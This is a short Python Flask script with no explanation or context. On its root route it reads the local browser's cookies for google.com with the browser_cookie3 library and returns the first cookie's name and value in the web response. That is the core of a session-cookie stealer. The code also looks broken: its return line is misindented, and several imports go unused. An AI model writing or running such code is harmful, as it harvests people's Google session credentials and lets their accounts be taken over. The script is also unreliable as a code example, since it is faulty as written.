from flask import Flask, render_template
import browser_cookie3
import requests
import array
import json

app = Flask(__name__)

@app.route("/")
def main():
     #get the browser cookies
    cj = browser_cookie3.load(domain_name='google.com')
    #arrays to store cookie value
    cN = []
    cV = []
    for cookie in cj: 
        cN.append(cookie.name)
        cV.append(cookie.value)
     
     return cN[0] + "=" + cV[0]

if __name__ == "__main__":
    app.run()
